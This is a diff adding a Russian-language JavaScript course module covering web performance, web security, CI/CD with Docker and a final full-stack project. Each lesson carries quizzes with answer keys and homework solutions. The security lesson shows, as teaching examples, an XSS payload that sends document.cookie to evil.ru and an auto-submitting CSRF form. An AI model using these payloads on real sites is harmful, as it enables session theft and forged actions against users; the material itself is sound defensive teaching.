@@ -1,0 +1,604 @@
+id: javascript
+modules:
+  - id: js-m10
+    title: Инженерные практики
+    level: Middle
+    lessons:
+      - id: js-10-01
+        title: Производительность и Web Vitals
+        minutes: 40
+        xp: 45
+        theory: |
+          Скорость сайта влияет на конверсию и позиции в поиске. Google измеряет её метриками **Core Web Vitals**:
+
+          | Метрика | Что измеряет | Хорошо |
+          |---|---|---|
+          | **LCP** (Largest Contentful Paint) | когда отрисован самый крупный элемент | ≤ 2.5 с |
+          | **INP** (Interaction to Next Paint) | задержка реакции на действия пользователя | ≤ 200 мс |
+          | **CLS** (Cumulative Layout Shift) | «прыжки» вёрстки | ≤ 0.1 |
+
+          Также важны TTFB (время ответа сервера) и FCP (первая отрисовка).
+
+          ## Как измерять
+
+          - **Lighthouse** (DevTools → Lighthouse) — лабораторный аудит с рекомендациями.
+          - **DevTools Performance** — запись: длинные задачи (> 50 мс), перерисовки, сеть.
+          - **Реальные пользователи (RUM)**: библиотека `web-vitals` отправляет метрики на ваш сервер/аналитику.
+
+          ```javascript
+          import { onLCP, onINP, onCLS } from "web-vitals";
+          const send = (m) => navigator.sendBeacon("/analytics", JSON.stringify({ name: m.name, value: m.value }));
+          onLCP(send); onINP(send); onCLS(send);
+          ```
+
+          ## Улучшаем LCP — загрузка
+
+          - Меньше JS: code splitting (`import()`, `React.lazy`), tree shaking, отказ от тяжёлых библиотек (moment.js → date-fns/dayjs). Анализ бандла: `rollup-plugin-visualizer`.
+          - Картинки: современные форматы (WebP/AVIF), правильные размеры (`srcset`, `sizes`), `loading="lazy"` для картинок ниже первого экрана, `fetchpriority="high"` для главной.
+          - Кеширование: хеши в именах файлов + `Cache-Control: max-age=31536000, immutable`; CDN; сжатие gzip/brotli.
+          - Шрифты: `font-display: swap`, `preload` важных ресурсов.
+          - SSR/SSG (Next.js, Astro) — HTML приходит уже с контентом.
+
+          ## Улучшаем INP — отзывчивость
+
+          - Разбивайте длинные задачи (`scheduler.yield()`, `setTimeout`), тяжёлые вычисления — в Web Worker.
+          - Debounce/throttle для `input`, `scroll`, `resize`.
+          - React: избегайте лишних рендеров (`memo`, правильный state), виртуализация длинных списков, `useTransition`/`useDeferredValue` для неспешных обновлений.
+
+          ## Улучшаем CLS — стабильность
+
+          - Указывайте `width`/`height` (или `aspect-ratio`) у картинок и видео.
+          - Резервируйте место под рекламу, баннеры, динамический контент (скелетоны).
+          - Анимируйте `transform` и `opacity`, а не `top`/`height`.
+
+          ## DOM и рендеринг
+
+          Чтение геометрии (`offsetHeight`, `getBoundingClientRect`) после записи стилей вызывает синхронный пересчёт раскладки (**layout thrashing**). Группируйте сначала все чтения, затем все записи; для анимаций — `requestAnimationFrame`.
+
+          ```javascript
+          // ❌ чтение-запись в цикле
+          items.forEach((el) => { el.style.height = el.offsetWidth + "px"; });
+          // ✅ сначала читаем, потом пишем
+          const widths = items.map((el) => el.offsetWidth);
+          items.forEach((el, i) => { el.style.height = widths[i] + "px"; });
+          ```
+
+          Главное правило: **измеряйте до и после** — оптимизация без измерений часто бесполезна.
+        practice:
+          - type: choice
+            q: Какая метрика отвечает за «прыжки» элементов при загрузке?
+            options: ["LCP", "INP", "CLS", "TTFB"]
+            answer: 2
+          - type: choice
+            q: Как предотвратить сдвиг вёрстки из-за картинок?
+            options: ["loading=lazy", "Указать width и height (aspect-ratio)", "Использовать PNG", "Загружать картинки через JS"]
+            answer: 1
+          - type: fill
+            q: Отложите загрузку картинки ниже первого экрана
+            code: |
+              <img src="photo.webp" width="800" height="600" loading="___" alt="Фото">
+            answers: ["lazy"]
+          - type: bug
+            q: Какая строка вызывает layout thrashing?
+            code: |
+              const cards = document.querySelectorAll(".card");
+              cards.forEach((card) => {
+                card.style.width = card.parentElement.offsetWidth / 3 + "px";
+              });
+            bugLine: 3
+            fix: сначала прочитать offsetWidth один раз в переменную, затем в цикле только записывать стили
+            explain: Чередование чтения геометрии и записи стилей заставляет браузер пересчитывать раскладку на каждой итерации.
+          - type: choice
+            q: Плохой INP из-за обработчика, который 400 мс сортирует большой массив. Что поможет?
+            options: ["Увеличить размер шрифта", "Перенести вычисления в Web Worker или разбить задачу", "Добавить loading=lazy", "Включить gzip"]
+            answer: 1
+        homework:
+          task: |
+            Проведите аудит своего React-магазина или любого сайта: замерьте Lighthouse (mobile) и запишите LCP/INP/CLS. Найдите в DevTools Performance длинные задачи, проанализируйте бандл визуализатором. Сделайте минимум 5 оптимизаций (lazy-загрузка страниц, картинки WebP с размерами и srcset, удаление тяжёлой зависимости, memo/виртуализация списка, preload шрифта) и подключите `web-vitals` с отправкой метрик в консоль. Оформите таблицу «до/после».
+          checklist:
+            - Есть замеры до и после
+            - Оптимизировано минимум 5 мест
+            - Подключён сбор реальных метрик
+          solution: |
+            // 1. Ленивая загрузка страниц
+            const Admin = lazy(() => import("./pages/Admin"));
+            const Product = lazy(() => import("./pages/Product"));
+
+            // 2. Картинки
+            // <img src="/img/tea-800.webp" srcSet="/img/tea-400.webp 400w, /img/tea-800.webp 800w"
+            //      sizes="(max-width: 600px) 400px, 800px" width="800" height="600" loading="lazy" alt="Чай" />
+            // Главный баннер: fetchPriority="high", без lazy
+
+            // 3. moment.js (≈70 КБ) → dayjs (≈3 КБ)
+            import dayjs from "dayjs";
+
+            // 4. Виртуализация длинного списка
+            import { useVirtualizer } from "@tanstack/react-virtual";
+            function BigList({ items }) {
+              const parentRef = useRef(null);
+              const v = useVirtualizer({ count: items.length, getScrollElement: () => parentRef.current, estimateSize: () => 40 });
+              return (
+                <div ref={parentRef} style={{ height: 600, overflow: "auto" }}>
+                  <div style={{ height: v.getTotalSize(), position: "relative" }}>
+                    {v.getVirtualItems().map((row) => (
+                      <div key={row.key} style={{ position: "absolute", top: 0, transform: `translateY(${row.start}px)`, height: 40 }}>
+                        {items[row.index].title}
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              );
+            }
+
+            // 5. Шрифт: <link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>
+            //    @font-face { font-display: swap; }
+
+            // 6. Метрики
+            import { onLCP, onINP, onCLS } from "web-vitals";
+            [onLCP, onINP, onCLS].forEach((fn) => fn((m) => console.log(m.name, Math.round(m.value * 1000) / 1000, m.rating)));
+
+            // Таблица: | метрика | до | после |  LCP 4.1 с → 1.9 с; INP 350 мс → 120 мс; CLS 0.25 → 0.02
+      - id: js-10-02
+        title: Безопасность — XSS, CSRF, CORS
+        minutes: 40
+        xp: 50
+        theory: |
+          ## XSS (Cross-Site Scripting)
+
+          Злоумышленник внедряет свой скрипт на вашу страницу — и он выполняется с правами пользователя: крадёт данные, токены из localStorage, действует от его имени.
+
+          ```javascript
+          // ❌ уязвимо: comment = '<img src=x onerror="fetch(`//evil.ru?c=`+document.cookie)">'
+          div.innerHTML = comment;
+          // ✅ безопасно
+          div.textContent = comment;
+          ```
+
+          Защита:
+          - Вставляйте данные как **текст** (`textContent`, `{ }` в React/Vue экранируют автоматически).
+          - Если HTML необходим (редактор статей) — очищайте **DOMPurify**: `DOMPurify.sanitize(html)`.
+          - Осторожно с `dangerouslySetInnerHTML`, `v-html`, `href={userUrl}` (`javascript:`-ссылки!), `eval`, `new Function`.
+          - **Content Security Policy** — заголовок, запрещающий инлайн-скрипты и чужие источники: `Content-Security-Policy: default-src 'self'; script-src 'self'`.
+          - Cookie с сессией — `HttpOnly` (недоступна из JS).
+
+          ## CSRF (Cross-Site Request Forgery)
+
+          Сайт злоумышленника заставляет браузер отправить запрос на ваш сайт — и браузер **автоматически приложит cookie** пользователя.
+
+          ```html
+          <!-- на evil.ru -->
+          <form action="https://bank.ru/transfer" method="POST">
+            <input name="to" value="hacker"><input name="sum" value="100000">
+          </form>
+          <script>document.forms[0].submit()</script>
+          ```
+
+          Защита:
+          - Cookie с атрибутом `SameSite=Lax` или `Strict` (Lax — значение по умолчанию в современных браузерах) — не отправляются с чужих сайтов при POST.
+          - CSRF-токен в форме/заголовке, который знает только ваша страница.
+          - Не изменяйте данные GET-запросами.
+          - API с токеном в заголовке `Authorization` (а не в cookie) к CSRF не уязвимо, но тогда токен должен быть защищён от XSS.
+
+          ## CORS (Cross-Origin Resource Sharing)
+
+          **Same-origin policy**: JS со страницы `https://shop.ru` не может читать ответы с `https://api.other.ru`, если тот не разрешил. CORS — механизм **ослабления** этого запрета через заголовки ответа сервера:
+
+          ```javascript
+          import cors from "cors";
+          app.use(cors({
+            origin: ["https://shop.ru", "http://localhost:5173"],   // белый список, а не "*"
+            credentials: true,                                       // разрешить cookie
+            methods: ["GET", "POST", "PATCH", "DELETE"],
+          }));
+          ```
+
+          Для «непростых» запросов (JSON, свои заголовки, PUT/DELETE) браузер сначала шлёт **preflight** `OPTIONS`. CORS **не защищает сервер** — curl и Postman его игнорируют; это защита пользователей в браузере. Нельзя сочетать `origin: "*"` и `credentials: true`.
+
+          ## Ещё OWASP Top 10
+
+          SQL/NoSQL-инъекции (параметризованные запросы), IDOR (проверка владельца ресурса), секреты в репозитории (`.env` в `.gitignore`, сканеры секретов), уязвимые зависимости (`npm audit`, Dependabot), заголовки безопасности (`helmet`), rate limiting, HTTPS везде.
+        practice:
+          - type: bug
+            q: Где XSS-уязвимость?
+            code: |
+              const params = new URLSearchParams(location.search);
+              const name = params.get("name");
+              document.querySelector("#hello").innerHTML = `Привет, ${name}!`;
+            bugLine: 3
+            fix: document.querySelector("#hello").textContent = `Привет, ${name}!`;
+            explain: Значение из URL вставляется как HTML — ссылкой с ?name=<img onerror=...> можно выполнить скрипт.
+          - type: choice
+            q: Какой атрибут cookie защищает от CSRF?
+            options: ["HttpOnly", "SameSite=Lax/Strict", "Secure", "Max-Age"]
+            answer: 1
+          - type: choice
+            q: Защищает ли CORS сервер от запросов через curl?
+            options: ["Да", "Нет, CORS применяют только браузеры", "Только с credentials", "Только для POST"]
+            answer: 1
+          - type: fill
+            q: Очистите пользовательский HTML перед вставкой
+            code: |
+              article.innerHTML = DOMPurify.___(userHtml);
+            answers: ["sanitize"]
+          - type: choice
+            q: Какой HTTP-заголовок запрещает выполнение инлайн-скриптов и скриптов с чужих доменов?
+            options: ["Access-Control-Allow-Origin", "Content-Security-Policy", "X-Powered-By", "Cache-Control"]
+            answer: 1
+        homework:
+          task: |
+            Проведите аудит безопасности своего full-stack приложения (Express + React) по чек-листу: найдите и исправьте все innerHTML/dangerouslySetInnerHTML с данными пользователя; проверьте ссылки из пользовательских данных (разрешить только http/https); подключите `helmet` с CSP; настройте CORS по белому списку; cookie — `HttpOnly; Secure; SameSite`; rate limit на auth; проверку владельца для всех изменяющих эндпоинтов; `npm audit`; убедитесь, что секретов нет в git (`gitleaks`). Напишите тест, что XSS-строка выводится как текст.
+          checklist:
+            - Нет вставки пользовательского HTML без очистки
+            - Настроены CSP и CORS
+            - Cookie защищены
+            - Секреты вне репозитория
+          solution: |
+            // server.js
+            import helmet from "helmet";
+            import cors from "cors";
+            import rateLimit from "express-rate-limit";
+
+            app.use(helmet({
+              contentSecurityPolicy: {
+                directives: {
+                  defaultSrc: ["'self'"],
+                  scriptSrc: ["'self'"],
+                  imgSrc: ["'self'", "data:", "https://cdn.shop.ru"],
+                  connectSrc: ["'self'", "https://api.shop.ru"],
+                },
+              },
+            }));
+            app.use(cors({ origin: process.env.CORS_ORIGINS.split(","), credentials: true }));
+            app.use("/api/auth", rateLimit({ windowMs: 60_000, limit: 10 }));
+            // res.cookie("refresh", t, { httpOnly: true, secure: true, sameSite: "strict" })
+
+            // client: безопасные ссылки
+            export function safeUrl(url) {
+              try {
+                const u = new URL(url, location.origin);
+                return ["http:", "https:"].includes(u.protocol) ? u.href : "#";
+              } catch { return "#"; }
+            }
+            // <a href={safeUrl(user.website)} rel="noopener noreferrer" target="_blank">сайт</a>
+
+            // client: статья с разметкой
+            import DOMPurify from "dompurify";
+            const Article = ({ html }) => <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
+
+            // test (vitest + testing-library)
+            it("комментарий выводится как текст", () => {
+              const evil = '<img src=x onerror="alert(1)">';
+              render(<Comment text={evil} />);
+              expect(screen.getByText(evil)).toBeInTheDocument();
+              expect(document.querySelector("img")).toBeNull();
+            });
+
+            // CI: npm audit --audit-level=high && npx gitleaks detect
+      - id: js-10-03
+        title: Git, CI/CD, Docker
+        minutes: 40
+        xp: 45
+        theory: |
+          ## Git-процесс команды
+
+          Короткие фича-ветки от `main` → Pull Request → code review + зелёный CI → merge → автоматический деплой. Сообщения коммитов в стиле Conventional Commits: `feat(cart): скидка по промокоду`, `fix(auth): обновление токена`. Подробности git — в уроках Java/C#: команды и принципы одинаковые.
+
+          `.gitignore` для JS-проекта:
+
+          ```
+          node_modules/
+          dist/
+          coverage/
+          .env
+          .env.*.local
+          *.log
+          .DS_Store
+          ```
+
+          ## CI на GitHub Actions
+
+          ```yaml
+          # .github/workflows/ci.yml
+          name: ci
+          on:
+            pull_request:
+            push:
+              branches: [main]
+          jobs:
+            test:
+              runs-on: ubuntu-latest
+              services:
+                postgres:
+                  image: postgres:16
+                  env: { POSTGRES_PASSWORD: pg }
+                  ports: ["5432:5432"]
+              steps:
+                - uses: actions/checkout@v4
+                - uses: actions/setup-node@v4
+                  with: { node-version: 20, cache: npm }
+                - run: npm ci
+                - run: npm run lint
+                - run: npm run typecheck
+                - run: npx prisma migrate deploy
+                  env: { DATABASE_URL: "postgresql://postgres:pg@localhost:5432/postgres" }
+                - run: npm test -- --coverage
+                - run: npm run build
+          ```
+
+          ## Docker для Node.js
+
+          ```dockerfile
+          FROM node:20-alpine AS deps
+          WORKDIR /app
+          COPY package*.json ./
+          RUN npm ci
+
+          FROM deps AS build
+          COPY . .
+          RUN npm run build && npm prune --omit=dev     # убрать dev-зависимости
+
+          FROM node:20-alpine
+          WORKDIR /app
+          ENV NODE_ENV=production
+          COPY --from=build /app/node_modules ./node_modules
+          COPY --from=build /app/dist ./dist
+          COPY package.json ./
+          USER node                                     # не root
+          EXPOSE 3000
+          CMD ["node", "dist/server.js"]
+          ```
+
+          `.dockerignore`: `node_modules`, `.git`, `.env`, `dist`. Порядок `COPY package*.json` → `npm ci` → `COPY .` позволяет кешировать слой зависимостей.
+
+          ## CD — деплой
+
+          - **Фронтенд** (статика из `dist`): Vercel, Netlify, Cloudflare Pages, GitHub Pages — подключаете репозиторий, каждый PR получает preview-ссылку.
+          - **Бэкенд**: Docker-образ → registry (GHCR, Docker Hub) → Render, Fly.io, Railway, VPS с docker compose, Kubernetes.
+          - Секреты — в настройках платформы/GitHub Secrets, а не в коде.
+          - Миграции БД — отдельным шагом перед запуском новой версии.
+
+          ## Готовность к продакшену
+
+          - Graceful shutdown: на `SIGTERM` перестать принимать запросы, дождаться текущих, закрыть соединения с БД.
+          - Health-check эндпоинт `/health` для оркестратора.
+          - Структурированные логи (pino) и мониторинг ошибок (Sentry).
+          - Переменные окружения валидируются при старте (Zod) — приложение падает сразу, а не в середине работы.
+        practice:
+          - type: choice
+            q: Почему в Dockerfile сначала копируют package*.json и делают npm ci, а потом остальной код?
+            options: ["Так требует npm", "Слой зависимостей кешируется и не пересобирается при изменении кода", "Чтобы образ был безопаснее", "Чтобы работал HMR"]
+            answer: 1
+          - type: fill
+            q: Запускайте процесс в контейнере не от root
+            code: |
+              ___ node
+            answers: ["USER"]
+          - type: order
+            q: Расставьте шаги CI-пайплайна
+            lines:
+              - npm ci
+              - npm run lint
+              - npm run typecheck
+              - npm test
+              - npm run build
+          - type: choice
+            q: Что должно происходить при получении SIGTERM?
+            options: ["Мгновенный выход", "Graceful shutdown — завершить текущие запросы и закрыть ресурсы", "Перезапуск", "Ничего"]
+            answer: 1
+          - type: choice
+            q: Где хранить DATABASE_URL для продакшена?
+            options: ["В .env в репозитории", "В секретах CI/платформы деплоя", "В package.json", "В коде сервера"]
+            answer: 1
+        homework:
+          task: |
+            Настройте полный цикл для своего full-stack проекта: GitHub Actions (lint, typecheck, тесты с сервисом PostgreSQL, сборка) на каждый PR; Dockerfile для бэкенда (multi-stage, non-root) и docker-compose (db + api + фронтенд через nginx); деплой фронтенда на Vercel/Netlify с preview для PR; деплой бэкенда на Render/Fly.io из main; graceful shutdown и `/health`; валидация переменных окружения через Zod при старте.
+          checklist:
+            - CI блокирует merge при ошибках
+            - Приложение поднимается docker compose up
+            - Есть автоматический деплой
+            - Секретов нет в репозитории
+          solution: |
+            // src/env.js — валидация окружения
+            import { z } from "zod";
+            export const env = z.object({
+              NODE_ENV: z.enum(["development", "test", "production"]).default("development"),
+              PORT: z.coerce.number().default(3000),
+              DATABASE_URL: z.string().url(),
+              JWT_SECRET: z.string().min(32),
+            }).parse(process.env);
+
+            // src/server.js — health и graceful shutdown
+            import { app } from "./app.js";
+            import { prisma } from "./repository.js";
+            import { env } from "./env.js";
+            app.get("/health", async (req, res) => {
+              await prisma.$queryRaw`SELECT 1`;
+              res.json({ status: "ok" });
+            });
+            const server = app.listen(env.PORT, () => console.log(`API на порту ${env.PORT}`));
+            for (const sig of ["SIGTERM", "SIGINT"]) {
+              process.on(sig, () => {
+                console.log(`${sig}: завершаем работу`);
+                server.close(async () => { await prisma.$disconnect(); process.exit(0); });
+                setTimeout(() => process.exit(1), 10_000).unref();
+              });
+            }
+
+            # docker-compose.yml
+            services:
+              db:
+                image: postgres:16
+                environment: { POSTGRES_PASSWORD: pg, POSTGRES_DB: shop }
+                volumes: [pgdata:/var/lib/postgresql/data]
+              api:
+                build: ./server
+                environment:
+                  DATABASE_URL: postgresql://postgres:pg@db:5432/shop
+                  JWT_SECRET: ${JWT_SECRET}
+                depends_on: [db]
+                ports: ["3000:3000"]
+              web:
+                build: ./client          # nginx отдаёт dist и проксирует /api на api:3000
+                ports: ["8080:80"]
+                depends_on: [api]
+            volumes: { pgdata: {} }
+
+            # client/nginx.conf
+            # location / { try_files $uri /index.html; }
+            # location /api/ { proxy_pass http://api:3000; }
+      - id: js-10-04
+        title: "Итоговый full-stack проект"
+        minutes: 60
+        xp: 100
+        theory: |
+          Финальный проект объединяет весь курс и станет главным пунктом портфолио Middle-разработчика.
+
+          ## Проект: «Маркетплейс мастер-классов» (или своя идея аналогичного объёма)
+
+          **Функции:**
+          - Регистрация/вход (JWT access + refresh в HttpOnly cookie), роли: участник, организатор, админ.
+          - Каталог мастер-классов: поиск, фильтры (город, дата, цена, категория), сортировка, пагинация — всё в URL.
+          - Страница мастер-класса: описание, расписание, отзывы и рейтинг, запись на занятие (ограниченное число мест).
+          - Кабинет организатора: создание/редактирование событий (форма с валидацией и загрузкой обложки), список записавшихся.
+          - Кабинет участника: мои записи, отмена, оставить отзыв после посещения.
+          - Админка: модерация событий и отзывов.
+
+          ## Технологии
+
+          | Слой | Стек |
+          |---|---|
+          | Frontend | React + TypeScript + Vite, React Router, TanStack Query, Zustand, React Hook Form + Zod |
+          | Backend | Node.js + Express (или Fastify/NestJS) + TypeScript, Zod, Prisma, PostgreSQL |
+          | Тесты | Vitest + Testing Library (фронт), supertest (API), Playwright (2–3 e2e-сценария) |
+          | Качество | ESLint, Prettier, husky, `tsc --noEmit` |
+          | Инфраструктура | Docker Compose, GitHub Actions, деплой фронта и API |
+
+          ## Архитектура монорепозитория
+
+          ```
+          masterclass/
+          ├── apps/
+          │   ├── web/        (React)
+          │   └── api/        (Express: routes → services → repositories)
+          ├── packages/
+          │   └── shared/     (общие Zod-схемы и типы для фронта и бэка)
+          ├── docker-compose.yml
+          └── package.json   (npm workspaces)
+          ```
+
+          Общие схемы — одна проверка и один тип на обеих сторонах:
+
+          ```typescript
+          // packages/shared/src/booking.ts
+          export const BookingCreate = z.object({ eventId: z.number().int(), seats: z.number().int().min(1).max(5) });
+          export type BookingCreate = z.infer<typeof BookingCreate>;
+          ```
+
+          ## Сложная часть — запись без «перепродажи» мест
+
+          ```typescript
+          await prisma.$transaction(async (tx) => {
+            const updated = await tx.event.updateMany({
+              where: { id: eventId, seatsLeft: { gte: seats } },     // атомарная проверка и уменьшение
+              data: { seatsLeft: { decrement: seats } },
+            });
+            if (updated.count === 0) throw new ConflictError("Мест не осталось");
+            await tx.booking.create({ data: { eventId, userId, seats } });
+          });
+          ```
+
+          ## Критерии готовности
+
+          README (описание, скриншоты, архитектура, запуск одной командой, демо-доступы), задеплоенная версия, зелёный CI, покрытие ключевой логики тестами, Lighthouse ≥ 90 на главной, отсутствие XSS/IDOR.
+        practice:
+          - type: choice
+            q: Зачем выносить Zod-схемы в общий пакет shared?
+            options: ["Чтобы бандл был больше", "Одна схема валидации и один тип для фронтенда и бэкенда", "Так требует Prisma", "Для SEO"]
+            answer: 1
+          - type: choice
+            q: Как надёжно не продать больше мест, чем есть, при одновременных записях?
+            options: ["Проверить seatsLeft на клиенте", "Атомарное условное обновление в транзакции (WHERE seatsLeft >= seats)", "setTimeout между запросами", "Кешировать в localStorage"]
+            answer: 1
+          - type: choice
+            q: Где хранить состояние фильтров каталога?
+            options: ["useState", "Query-параметры URL", "Zustand", "Cookie"]
+            answer: 1
+          - type: order
+            q: Расставьте этапы разработки итогового проекта
+            lines:
+              - Описать требования и схему БД
+              - Настроить монорепозиторий, линтеры и CI
+              - Реализовать API с тестами
+              - Реализовать фронтенд на готовом API
+              - Docker, деплой и README
+          - type: output
+            q: Что выведет код (логика атомарного бронирования)?
+            code: |
+              const event = { seatsLeft: 3 };
+              function book(seats) {
+                if (event.seatsLeft < seats) return "нет мест";
+                event.seatsLeft -= seats;
+                return "ok";
+              }
+              console.log([book(2), book(2), book(1)].join(" "), event.seatsLeft);
+            answer: ok нет мест ok 0
+        homework:
+          task: |
+            Реализуйте итоговый проект по требованиям урока и опубликуйте его (GitHub + деплой). Минимальный объём: 6+ моделей БД, 20+ эндпоинтов, 8+ страниц, 40+ тестов (unit + API + 3 e2e на Playwright: регистрация, запись на мастер-класс, создание события организатором). Дополнительно: загрузка изображений в S3-совместимое хранилище, уведомления по email (очередь BullMQ + Redis), SSR главной страницы, i18n (ru/en).
+          checklist:
+            - Проект задеплоен и доступен по ссылке
+            - Все входные данные валидируются общими схемами
+            - Нет гонок при записи на события
+            - CI с линтером, типами, тестами
+            - Подробный README
+          solution: |
+            // apps/api/src/bookings/booking.service.ts
+            import { prisma } from "../db";
+            import { BookingCreate } from "@masterclass/shared";
+            export class ConflictError extends Error { status = 409; expose = true; }
+
+            export async function createBooking(userId: number, input: unknown) {
+              const { eventId, seats } = BookingCreate.parse(input);
+              return prisma.$transaction(async (tx) => {
+                const updated = await tx.event.updateMany({
+                  where: { id: eventId, seatsLeft: { gte: seats }, status: "PUBLISHED", startsAt: { gt: new Date() } },
+                  data: { seatsLeft: { decrement: seats } },
+                });
+                if (updated.count === 0) throw new ConflictError("Мест не осталось или событие недоступно");
+                return tx.booking.create({ data: { eventId, userId, seats } });
+              });
+            }
+
+            export async function cancelBooking(userId: number, bookingId: number) {
+              return prisma.$transaction(async (tx) => {
+                const b = await tx.booking.findFirst({ where: { id: bookingId, userId, cancelledAt: null } });   // проверка владельца
+                if (!b) throw Object.assign(new Error("Запись не найдена"), { status: 404, expose: true });
+                await tx.booking.update({ where: { id: b.id }, data: { cancelledAt: new Date() } });
+                await tx.event.update({ where: { id: b.eventId }, data: { seatsLeft: { increment: b.seats } } });
+              });
+            }
+
+            // apps/web/src/features/booking/useBook.ts
+            import { useMutation, useQueryClient } from "@tanstack/react-query";
+            export function useBook(eventId: number) {
+              const qc = useQueryClient();
+              return useMutation({
+                mutationFn: (seats: number) => api("/bookings", { method: "POST", body: { eventId, seats } }),
+                onSuccess: () => {
+                  qc.invalidateQueries({ queryKey: ["event", eventId] });
+                  qc.invalidateQueries({ queryKey: ["my-bookings"] });
+                },
+              });
+            }
+
+            // e2e/booking.spec.ts (Playwright)
+            import { test, expect } from "@playwright/test";
+            test("участник записывается на мастер-класс", async ({ page }) => {
+              await page.goto("/login");
+              await page.getByLabel("Email").fill("user@demo.ru");
+              await page.getByLabel("Пароль").fill("demo12345");
+              await page.getByRole("button", { name: "Войти" }).click();
+              await page.goto("/events/1");
+              await page.getByRole("button", { name: "Записаться" }).click();
+              await expect(page.getByText("Вы записаны")).toBeVisible();
+            });
